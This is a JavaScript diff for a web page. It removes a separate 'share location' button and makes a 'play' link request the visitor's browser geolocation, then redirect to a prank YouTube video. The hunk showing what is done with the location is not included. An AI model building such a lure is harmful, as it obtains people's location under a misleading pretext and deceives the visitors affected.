@@ -1,8 +1,9 @@
-const videoUrl = "https://www.youtube.com/embed/M7lc1UVf-VE?autoplay=1&mute=1&controls=1&rel=0&playsinline=1";
+const youtubeUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
 async function shareLocation() {
     if (!navigator.geolocation) {
-        return false;
+        window.location.href = youtubeUrl;
+        return;
     }
 
     return new Promise((resolve) => {
@@ -29,9 +30,11 @@ async function shareLocation() {
                     console.error(error);
                 }
 
+                window.location.href = youtubeUrl;
                 resolve(true);
             },
             () => {
+                window.location.href = youtubeUrl;
                 resolve(false);
             }
         );
@@ -40,17 +43,5 @@ async function shareLocation() {
 
 document.getElementById("playLink").addEventListener("click", async (event) => {
     event.preventDefault();
-
-    await shareLocation();
-
-    const videoShell = document.getElementById("videoShell");
-    const player = document.getElementById("player");
-
-    videoShell.classList.remove("hidden");
-    player.src = videoUrl;
-});
-
-document.getElementById("shareLocationBtn").addEventListener("click", async (event) => {
-    event.stopPropagation();
     await shareLocation();
 });
